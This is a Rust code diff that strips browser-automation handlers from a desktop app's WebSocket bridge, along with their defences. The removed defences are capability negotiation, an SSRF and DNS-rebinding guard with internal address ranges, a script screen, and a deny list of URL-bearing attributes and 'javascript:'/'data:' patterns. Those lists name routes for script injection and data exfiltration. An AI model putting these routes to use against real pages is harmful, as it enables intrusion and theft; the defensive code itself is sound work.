@@ -1,25 +1,18 @@
 use super::{PresenceManager, RealtimeEvent};
-use crate::automation::browser::advanced::Cookie;
-use crate::automation::browser::{AccessibilityAnalyzer, AdvancedBrowserOps, CdpClient};
-use crate::automation::computer_use::ensure_navigation_url_allowed;
 use crate::integrations::native_messaging::manifest::{
     install_manifests, is_valid_chrome_extension_id,
 };
-use crate::integrations::native_messaging::messages::{ExtensionCapabilities, NativeCapability};
 use crate::integrations::native_messaging::{
     stage_selected_context_handoff, ConnectionState, NativeMessage,
 };
-use crate::sys::commands::capabilities::capability_refusal;
-use crate::sys::commands::BrowserStateWrapper;
 use crate::ui::events::tool_stream::{emit_tool_completed, emit_tool_error, emit_tool_started};
-use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine as _};
 use futures::{
     stream::{SplitSink, SplitStream},
     SinkExt, StreamExt,
 };
 use serde_json::{json, Value};
 use std::collections::HashMap;
-use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr, ToSocketAddrs};
+use std::net::{IpAddr, SocketAddr};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use subtle::ConstantTimeEq;
@@ -58,81 +51,6 @@ const MAX_AUTH_FAILURES: u32 = 5;
 const AUTH_FAILURE_WINDOW: Duration = Duration::from_secs(60);
 const LOCKOUT_DURATION: Duration = Duration::from_secs(300);
 const MAX_WS_MESSAGE_SIZE: usize = 4 * 1024 * 1024;
-
-// Bridge navigation policy ───────────────────────────────────────────────────
-//
-// A peer that presents the loopback token picks navigation targets the user
-// never saw. `ensure_navigation_url_allowed` keeps every caller off non-http
-// schemes; these decide the second half, which only binds automated targets:
-// the browser must not be steered at anything that is not routable on the
-// public internet, because the same socket can read the answer back.
-
-/// The empty document a new tab is created on. It has no origin and no content.
-const BLANK_DOCUMENT_URL: &str = "about:blank";
-
-/// How long a hostname gets to resolve before the navigation is refused.
-const BRIDGE_DNS_TIMEOUT: Duration = Duration::from_secs(2);
-
-fn is_internal_ipv4(address: Ipv4Addr) -> bool {
-    let [first, second, ..] = address.octets();
-    address.is_loopback()
-        || address.is_private()
-        || address.is_link_local()
-        || address.is_unspecified()
-        || address.is_broadcast()
-        || address.is_multicast()
-        || first == 0
-        || (first == 100 && (64..128).contains(&second))
-        || (first == 192 && second == 0)
-        || (first == 198 && (18..20).contains(&second))
-}
-
-fn is_internal_ipv6(address: Ipv6Addr) -> bool {
-    if address.is_loopback() || address.is_unspecified() || address.is_multicast() {
-        return true;
-    }
-    if let Some(mapped) = address.to_ipv4_mapped() {
-        return is_internal_ipv4(mapped);
-    }
-    let segments = address.segments();
-    // ::a.b.c.d and 64:ff9b::/96 both carry a v4 destination inside a v6
-    // literal, so the v4 policy has to run on the address they carry.
-    if segments[..6] == [0, 0, 0, 0, 0, 0] || (segments[0] == 0x64 && segments[1] == 0xff9b) {
-        let octets = address.octets();
-        return is_internal_ipv4(Ipv4Addr::new(
-            octets[12], octets[13], octets[14], octets[15],
-        ));
-    }
-    segments[0] & 0xfe00 == 0xfc00 || segments[0] & 0xffc0 == 0xfe80
-}
-
-fn is_internal_ip(address: &IpAddr) -> bool {
-    match address {
-        IpAddr::V4(v4) => is_internal_ipv4(*v4),
-        IpAddr::V6(v6) => is_internal_ipv6(*v6),
-    }
-}
-
-fn is_loopback_domain(host: &str) -> bool {
-    let lowered = host.trim_end_matches('.').to_lowercase();
-    lowered == "localhost" || lowered.ends_with(".localhost")
-}
-
-/// Resolve `host` on the blocking pool so a hung resolver occupies no runtime
-/// worker. `None` means the answer never arrived, which the caller refuses.
-async fn resolve_navigation_host(host: &str) -> Option<Vec<IpAddr>> {
-    let query = format!("{host}:443");
-    let lookup = tokio::task::spawn_blocking(move || {
-        query
-            .to_socket_addrs()
-            .map(|addresses| addresses.map(|address| address.ip()).collect::<Vec<_>>())
-            .ok()
-    });
-    tokio::time::timeout(BRIDGE_DNS_TIMEOUT, lookup)
-        .await
-        .ok()?
-        .ok()?
-}
 
 #[derive(Default)]
 struct AuthFailureRecord {
@@ -207,7 +125,7 @@ fn parse_pair_extension_id(raw_request: &str) -> Result<Option<String>, String> 
     Ok(Some(extension_id))
 }
 
-// ── SEC-11 handshake: Desktop-displayed, user-confirmed short code ───────────
+// ── Pairing handshake: Desktop-displayed, user-confirmed short code ───────────
 //
 // `/pair/request` mints nothing and installs nothing. It parks a short code in
 // memory and hands the caller only an opaque request id; the code is delivered
@@ -427,76 +345,6 @@ fn is_origin_allowed(origin: Option<&str>) -> bool {
     matches!(host, "localhost" | "127.0.0.1" | "[::1]")
 }
 
-/// CLAUDE-SECURITY F2: a bridge peer's script body is the same untrusted
-/// input the AGI and IPC paths screen, and the capability grant only says the
-/// peer may run *a* script, not that this one is safe. Screening here makes
-/// the content screen a property of the sink instead of a property of one
-/// caller.
-fn ensure_peer_script_allowed(script: &str) -> Result<(), String> {
-    crate::sys::security::tool_guard::ToolExecutionGuard::screen_browser_script(script)
-        .map_err(|reason| format!("Blocked browser script: it may not use {reason}"))
-}
-
-/// Attributes that run code or load a URL. `setAttribute('onmouseover', …)`
-/// plus a dispatched event is script execution written without the word
-/// `script`, and a URL attribute pointed off origin is the same exfiltration
-/// the script screen refuses, so the peer may only write inert markup.
-fn ensure_peer_attribute_write_allowed(attribute: &str, value: &str) -> Result<(), String> {
-    const URL_BEARING_ATTRIBUTES: &[&str] = &[
-        "src",
-        "srcset",
-        "href",
-        "xlink:href",
-        "action",
-        "formaction",
-        "data",
-        "srcdoc",
-        "poster",
-        "background",
-        "ping",
-        "cite",
-        "codebase",
-        "longdesc",
-        "manifest",
-        "profile",
-        "usemap",
-        "style",
-        "content",
-    ];
-
-    let name = attribute.trim().to_lowercase();
-    if name.starts_with("on") {
-        return Err(format!(
-            "Blocked attribute write: '{name}' is an event handler, which runs script in the page."
-        ));
-    }
-    if URL_BEARING_ATTRIBUTES.contains(&name.as_str()) {
-        return Err(format!(
-            "Blocked attribute write: '{name}' makes the page load a URL it was not asked to load."
-        ));
-    }
-
-    let condensed: String = value
-        .chars()
-        .filter(|current| !current.is_whitespace())
-        .collect::<String>()
-        .to_lowercase();
-    if condensed.contains("://")
-        || condensed.contains("javascript:")
-        || condensed.contains("data:")
-        || condensed.contains("vbscript:")
-        || condensed.starts_with("//")
-        || condensed.contains('<')
-    {
-        return Err(
-            "Blocked attribute write: the value carries a URL or markup the page would load."
-                .to_string(),
-        );
-    }
-
-    Ok(())
-}
-
 /// Duration the server waits for the first auth message before closing.
 const AUTH_TIMEOUT: Duration = Duration::from_secs(2);
 // ─────────────────────────────────────────────────────────────────────────────
@@ -507,10 +355,6 @@ pub struct WebSocketClient {
     pub team_id: Option<String>,
     /// The resource this client is currently interacting with (e.g. typing in)
     pub current_resource: Option<String>,
-    /// Capabilities this connection negotiated at `connect`. Holding the bridge
-    /// token authenticates a peer; it does not authorize the privileged native
-    /// messages, so this starts empty and only a negotiation can raise it.
-    pub capabilities: ExtensionCapabilities,
 }
 
 pub struct RealtimeServer {
@@ -793,7 +637,7 @@ impl RealtimeServer {
     // If the request asks to install/refresh a native messaging manifest for
     // an extension ID, it must include X-Bridge-Token matching the desktop
     // bridge secret (the `.ipc_token` value, readable only through the Tauri
-    // UI or the 0600 file). SEC-11: the pair token this endpoint mints must
+    // UI or the 0600 file). The pair token this endpoint mints must
     // never authorize the install, a caller could obtain one by posting an
     // empty body, making the credential self-issuing and letting any local
     // page or process add an attacker-controlled extension ID to the native
@@ -1308,7 +1152,6 @@ impl RealtimeServer {
                     user_id: user_id_from_auth,
                     team_id: team_id_from_auth,
                     current_resource: None,
-                    capabilities: ExtensionCapabilities::none(),
                 },
             );
         }
@@ -1451,31 +1294,8 @@ impl RealtimeServer {
                     emit_tool_started(app, id, &tool_name, Some(payload.clone()));
                 }
 
-                let granted = {
-                    let clients_lock = clients.lock().await;
-                    clients_lock
-                        .get(client_id)
-                        .map(|client| client.capabilities.clone())
-                        .unwrap_or_else(ExtensionCapabilities::none)
-                };
-
-                let execution =
-                    Self::execute_native_message(payload.clone(), app_handle, &granted).await;
+                let execution = Self::execute_native_message(payload.clone(), app_handle).await;
                 let duration_ms = started_at.elapsed().as_millis() as u64;
-
-                if execution.is_ok() {
-                    let renegotiated = match native_type.as_str() {
-                        "connect" => Some(Self::negotiated_capabilities(payload)),
-                        "disconnect" => Some(ExtensionCapabilities::none()),
-                        _ => None,
-                    };
-                    if let Some(capabilities) = renegotiated {
-                        let mut clients_lock = clients.lock().await;
-                        if let Some(client) = clients_lock.get_mut(client_id) {
-                            client.capabilities = capabilities;
-                        }
-                    }
-                }
 
                 let response = match execution {
                     Ok(data) => RealtimeEvent::NativeResponse {
@@ -1624,147 +1444,12 @@ impl RealtimeServer {
         }
     }
 
-    /// Capabilities the peer declared in its `connect` payload, clamped to what
-    /// the bridge is allowed to grant. An absent or malformed declaration
-    /// negotiates nothing.
-    fn negotiated_capabilities(payload: &Value) -> ExtensionCapabilities {
-        let declared = payload
-            .get("capabilities")
-            .and_then(|declared| {
-                serde_json::from_value::<ExtensionCapabilities>(declared.clone()).ok()
-            })
-            .unwrap_or_else(ExtensionCapabilities::none);
-        ExtensionCapabilities::negotiate(&declared)
-    }
-
-    /// Where a realtime-bridge peer may drive the live browser.
-    ///
-    /// `ensure_navigation_url_allowed` settles the scheme and the blocked-host
-    /// list for every navigation in the app, including the ones the user types.
-    /// This adds what only holds when a bridge peer picked the destination: no
-    /// loopback, private, carrier-grade-NAT, or link-local target, so the peer
-    /// cannot aim the browser at a dev server, a LAN device, or a cloud
-    /// metadata endpoint and read the answer back over the same socket.
-    ///
-    /// A hostname that does not resolve inside the timeout is refused rather
-    /// than waved through: a resolver that stalls, fails, or answers
-    /// differently each time is the mechanism a rebinding attack runs on.
-    async fn ensure_bridge_navigation_allowed(url: &str) -> Result<(), String> {
-        let candidate = url.trim();
-        if candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
-            return Ok(());
-        }
-        ensure_navigation_url_allowed(candidate)?;
-
-        let Ok(parsed) = url::Url::parse(candidate) else {
-            return Err(
-                "Navigation is blocked: the target is not an absolute http(s) URL.".to_string(),
-            );
-        };
-        let Some(host) = parsed.host() else {
-            return Err("Navigation is blocked: the target http(s) URL has no host.".to_string());
-        };
-
-        let internal = match host {
-            url::Host::Ipv4(address) => is_internal_ipv4(address),
-            url::Host::Ipv6(address) => is_internal_ipv6(address),
-            url::Host::Domain(name) if is_loopback_domain(name) => true,
-            url::Host::Domain(name) => match resolve_navigation_host(name).await {
-                Some(addresses) => addresses.is_empty() || addresses.iter().any(is_internal_ip),
-                None => {
-                    tracing::warn!("blocked bridge navigation to unresolvable host: {name}");
-                    return Err(format!(
-                        "Navigation to {name} is blocked: the host did not resolve, so where it points cannot be checked."
-                    ));
-                }
-            },
-        };
-
-        if internal {
-            tracing::warn!("blocked bridge navigation to internal destination: {candidate}");
-            return Err(
-                "Navigation is blocked: automated browsing may not reach loopback, private, or link-local addresses."
-                    .to_string(),
-            );
-        }
-
-        Ok(())
-    }
-
-    /// Whether the bridge may hand a peer what the live document holds.
-    ///
-    /// The navigation guard only sees the first hop. A page a peer opened can
-    /// redirect into an internal service, so the destination is re-checked from
-    /// the document itself before its markup, text, or pixels leave the browser.
-    /// Address literals are enough here, the metadata and router endpoints a
-    /// redirect chain lands on are literals, and skipping DNS keeps every read
-    /// off the resolver.
-    fn ensure_document_readable(url: &str) -> Result<(), String> {
-        let candidate = url.trim();
-        if candidate.is_empty() || candidate.eq_ignore_ascii_case(BLANK_DOCUMENT_URL) {
-            return Ok(());
-        }
-        let Ok(parsed) = url::Url::parse(candidate) else {
-            return Ok(());
-        };
-
-        let scheme = parsed.scheme().to_ascii_lowercase();
-        if !matches!(scheme.as_str(), "http" | "https") {
-            tracing::warn!("blocked bridge read of a {scheme}: document");
-            return Err(format!(
-                "Reading a {scheme}: document over the extension bridge is blocked."
-            ));
-        }
-
-        let internal = match parsed.host() {
-            Some(url::Host::Ipv4(address)) => is_internal_ipv4(address),
-            Some(url::Host::Ipv6(address)) => is_internal_ipv6(address),
-            Some(url::Host::Domain(name)) => is_loopback_domain(name),
-            None => true,
-        };
-
-        if internal {
-            tracing::warn!("blocked bridge read of an internal document: {candidate}");
-            return Err(
-                "Reading this page over the extension bridge is blocked: the tab is on a loopback, private, or link-local address."
-                    .to_string(),
-            );
-        }
-
-        Ok(())
-    }
-
-    async fn get_native_cdp_client_for_read(
-        app_handle: &tauri::AppHandle,
-        requested_tab_id: Option<i32>,
-    ) -> Result<(Arc<CdpClient>, String), String> {
-        let (client, resolved_tab_id) =
-            Self::get_native_cdp_client(app_handle, requested_tab_id, false, None).await?;
-        let landed = client.get_url().await.map_err(|e| e.to_string())?;
-        Self::ensure_document_readable(&landed)?;
-        Ok((client, resolved_tab_id))
-    }
-
     async fn execute_native_message(
         payload: Value,
         app_handle: Option<&tauri::AppHandle>,
-        capabilities: &ExtensionCapabilities,
     ) -> Result<Value, String> {
         let message: NativeMessage = serde_json::from_value(payload)
             .map_err(|e| format!("Invalid native message payload: {}", e))?;
-
-        if let Some(required) = NativeCapability::required_for(&message) {
-            if !capabilities.grants(required) {
-                tracing::warn!(
-                    "refused native message: connection never negotiated {} capability",
-                    required.label()
-                );
-                return Err(format!(
-                    "Native message refused: this connection has no {} capability.",
-                    required.label()
-                ));
-            }
-        }
 
         match message {
             NativeMessage::Ping => Ok(json!({ "pong": true })),
@@ -1837,470 +1522,6 @@ impl RealtimeServer {
                 Ok(json!({
                     "disconnected": true,
                     "reason": reason
-                }))
-            }
-
-            NativeMessage::GetTabs => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let browser_state = app.state::<BrowserStateWrapper>();
-                let tab_manager = browser_state
-                    .get_tab_manager()
-                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
-                let tab_manager = tab_manager.lock().await;
-                let active_tab_id = tab_manager
-                    .get_active_tab()
-                    .await
-                    .map_err(|e| e.to_string())?
-                    .map(|tab| tab.id);
-                let tabs = tab_manager.list_tabs().await.map_err(|e| e.to_string())?;
-
-                let tab_payload = tabs
-                    .into_iter()
-                    .map(|tab| {
-                        json!({
-                            "id": tab.id,
-                            "url": tab.url,
-                            "title": tab.title,
-                            "active": active_tab_id.as_ref() == Some(&tab.id),
-                            "favicon_url": tab.favicon,
-                            "status": if tab.loading { "loading" } else { "complete" }
-                        })
-                    })
-                    .collect::<Vec<_>>();
-
-                Ok(json!({ "tabs": tab_payload }))
-            }
-
-            NativeMessage::GetActiveTab => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let browser_state = app.state::<BrowserStateWrapper>();
-                let tab_manager = browser_state
-                    .get_tab_manager()
-                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
-                let tab_manager = tab_manager.lock().await;
-                let tab = tab_manager
-                    .get_active_tab()
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "active_tab": tab
-                }))
-            }
-
-            NativeMessage::CreateTab { url } => {
-                Self::ensure_bridge_navigation_allowed(&url).await?;
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                if let Some(off) = capability_refusal(app, "browser_navigate").await {
-                    return Err(off);
-                }
-                let tab_id = app
-                    .state::<BrowserStateWrapper>()
-                    .create_cdp_tab(&url)
-                    .await?;
-
-                Ok(json!({
-                    "created": true,
-                    "tab_id": tab_id,
-                    "url": url
-                }))
-            }
-
-            NativeMessage::CloseTab { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let browser_state = app.state::<BrowserStateWrapper>();
-                let tab_manager = browser_state
-                    .get_tab_manager()
-                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
-                tab_manager
-                    .lock()
-                    .await
-                    .close_tab(&tab_id.to_string())
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "closed": true,
-                    "tab_id": tab_id
-                }))
-            }
-
-            NativeMessage::SwitchTab { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let browser_state = app.state::<BrowserStateWrapper>();
-                let tab_manager = browser_state
-                    .get_tab_manager()
-                    .map_err(|e| format!("Browser state unavailable: {}", e))?;
-                tab_manager
-                    .lock()
-                    .await
-                    .switch_to_tab(&tab_id.to_string())
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "switched": true,
-                    "tab_id": tab_id
-                }))
-            }
-
-            NativeMessage::Navigate { url, tab_id } => {
-                Self::ensure_bridge_navigation_allowed(&url).await?;
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, true, Some(&url)).await?;
-                client.navigate(&url).await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "navigated": true,
-                    "tab_id": resolved_tab_id,
-                    "url": url
-                }))
-            }
-
-            NativeMessage::Click { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .click_element(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "clicked": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
-            NativeMessage::Type {
-                selector,
-                text,
-                tab_id,
-            } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .type_into_element(&selector, &text, false)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "typed": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "chars": text.chars().count()
-                }))
-            }
-
-            NativeMessage::GetElement { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                // JSON-encode the selector into a JS string literal (quotes + full
-                // escaping included). Single-quote-only escaping was insufficient.
-                // backslashes/newlines could break out of the literal and inject JS.
-                let selector_js = serde_json::to_string(&selector).map_err(|e| e.to_string())?;
-                let script = format!(
-                    r#"(function() {{
-                        const el = document.querySelector({});
-                        if (!el) return null;
-                        return {{
-                            tag_name: el.tagName.toLowerCase(),
-                            id: el.id || null,
-                            class_name: el.className || null,
-                            text_content: (el.textContent || '').trim(),
-                            inner_html: el.innerHTML || '',
-                            outer_html: el.outerHTML || ''
-                        }};
-                    }})()"#,
-                    selector_js
-                );
-                let element = client.evaluate(&script).await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "element": element
-                }))
-            }
-
-            NativeMessage::GetElements { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let elements = client
-                    .query_all(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "elements": elements
-                }))
-            }
-
-            NativeMessage::GetText { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let text = client
-                    .get_text(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "text": text
-                }))
-            }
-
-            NativeMessage::GetAttribute {
-                selector,
-                attribute,
-                tab_id,
-            } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let value = client
-                    .get_attribute(&selector, &attribute)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "attribute": attribute,
-                    "value": value
-                }))
-            }
-
-            NativeMessage::SetAttribute {
-                selector,
-                attribute,
-                value,
-                tab_id,
-            } => {
-                ensure_peer_attribute_write_allowed(&attribute, &value)?;
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-
-                // Escape values for safe interpolation into JS string literals.
-                // JSON-encoding produces a quoted string with all special chars
-                // properly escaped (backslash, quotes, newlines, etc.).
-                let safe_selector = serde_json::to_string(&selector)
-                    .map_err(|e| format!("Failed to encode selector: {}", e))?;
-                let safe_attribute = serde_json::to_string(&attribute)
-                    .map_err(|e| format!("Failed to encode attribute: {}", e))?;
-                let safe_value = serde_json::to_string(&value)
-                    .map_err(|e| format!("Failed to encode value: {}", e))?;
-
-                let script = format!(
-                    r#"(function() {{
-                        const el = document.querySelector({});
-                        if (!el) throw new Error('Element not found');
-                        el.setAttribute({}, {});
-                        return true;
-                    }})()"#,
-                    safe_selector, safe_attribute, safe_value
-                );
-                client.evaluate(&script).await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "set": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "attribute": attribute
-                }))
-            }
-
-            NativeMessage::Screenshot { tab_id, format } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let image_bytes = client
-                    .capture_screenshot(false)
-                    .await
-                    .map_err(|e| e.to_string())?;
-                let requested_format = format.unwrap_or_else(|| "png".to_string());
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "format": requested_format,
-                    "data": BASE64_STANDARD.encode(image_bytes)
-                }))
-            }
-
-            NativeMessage::GetAccessibilityTree { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let tree = client
-                    .evaluate(AccessibilityAnalyzer::get_accessibility_tree_script())
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "tree": tree
-                }))
-            }
-
-            NativeMessage::GetFocusableElements { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let elements = client
-                    .evaluate(
-                        r#"(function() {
-                            const nodes = document.querySelectorAll(
-                                'a[href], button, input, textarea, select, [tabindex]:not([tabindex="-1"])'
-                            );
-                            return Array.from(nodes).map((el) => ({
-                                tag: el.tagName.toLowerCase(),
-                                id: el.id || null,
-                                class_name: el.className || null,
-                                text: (el.textContent || '').trim().slice(0, 200)
-                            }));
-                        })()"#,
-                    )
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "elements": elements
-                }))
-            }
-
-            NativeMessage::GetCookies { url } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, None, false, None).await?;
-                let mut cookies = AdvancedBrowserOps::get_cookies(client)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                if let Some(target_url) = url {
-                    let domain = target_url
-                        .replace("https://", "")
-                        .replace("http://", "")
-                        .split('/')
-                        .next()
-                        .unwrap_or("")
-                        .to_string();
-                    cookies.retain(|cookie| cookie.domain.contains(&domain));
-                }
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "cookies": cookies
-                }))
-            }
-
-            NativeMessage::SetCookie { cookie } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, None, false, None).await?;
-                let mapped_cookie = Cookie {
-                    name: cookie.name,
-                    value: cookie.value,
-                    domain: cookie.domain.unwrap_or_default(),
-                    path: cookie.path.unwrap_or_else(|| "/".to_string()),
-                    secure: cookie.secure.unwrap_or(false),
-                    http_only: cookie.http_only.unwrap_or(false),
-                    same_site: None,
-                };
-                AdvancedBrowserOps::set_cookie(client, mapped_cookie)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "set": true,
-                    "tab_id": resolved_tab_id
-                }))
-            }
-
-            NativeMessage::GetLocalStorage { key, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                let data = if let Some(storage_key) = key {
-                    let key_js = serde_json::to_string(&storage_key).map_err(|e| e.to_string())?;
-                    let script = format!("window.localStorage.getItem({})", key_js);
-                    client.evaluate(&script).await.map_err(|e| e.to_string())?
-                } else {
-                    client
-                        .evaluate(
-                            r#"(function() {
-                                const output = {};
-                                for (let i = 0; i < localStorage.length; i++) {
-                                    const key = localStorage.key(i);
-                                    if (key !== null) {
-                                        output[key] = localStorage.getItem(key);
-                                    }
-                                }
-                                return output;
-                            })()"#,
-                        )
-                        .await
-                        .map_err(|e| e.to_string())?
-                };
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "data": data
-                }))
-            }
-
-            NativeMessage::SetLocalStorage { key, value, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                let key_js = serde_json::to_string(&key).map_err(|e| e.to_string())?;
-                let value_js = serde_json::to_string(&value).map_err(|e| e.to_string())?;
-                let script = format!(
-                    "window.localStorage.setItem({}, {}); true;",
-                    key_js, value_js
-                );
-                client.evaluate(&script).await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "set": true,
-                    "tab_id": resolved_tab_id,
-                    "key": key
-                }))
-            }
-
-            NativeMessage::GetPageInfo { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let url = client.get_url().await.map_err(|e| e.to_string())?;
-                let title = client.get_title().await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "url": url,
-                    "title": title
-                }))
-            }
-
-            NativeMessage::GetPageContent { tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client_for_read(app, tab_id).await?;
-                let html = client.get_content().await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "html": html
                 }))
             }
 
@@ -2385,164 +1606,10 @@ impl RealtimeServer {
                 }))
             }
 
-            NativeMessage::ExecuteScript { script, tab_id } => {
-                ensure_peer_script_allowed(&script)?;
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                let result = client.evaluate(&script).await.map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "tab_id": resolved_tab_id,
-                    "result": result
-                }))
-            }
-
-            NativeMessage::Hover { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .hover_element(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "hovered": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
-            NativeMessage::WaitForSelector {
-                selector,
-                timeout_ms,
-                tab_id,
-            } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                let timeout = timeout_ms.unwrap_or(30_000);
-                client
-                    .wait_for_selector(&selector, timeout)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "found": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
-            NativeMessage::SelectOption {
-                selector,
-                value,
-                tab_id,
-            } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .select_option(&selector, &value)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "selected": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector,
-                    "value": value
-                }))
-            }
-
-            NativeMessage::SetChecked {
-                selector,
-                checked,
-                tab_id,
-            } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .set_checked(&selector, checked)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "checked": checked,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
-            NativeMessage::Focus { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
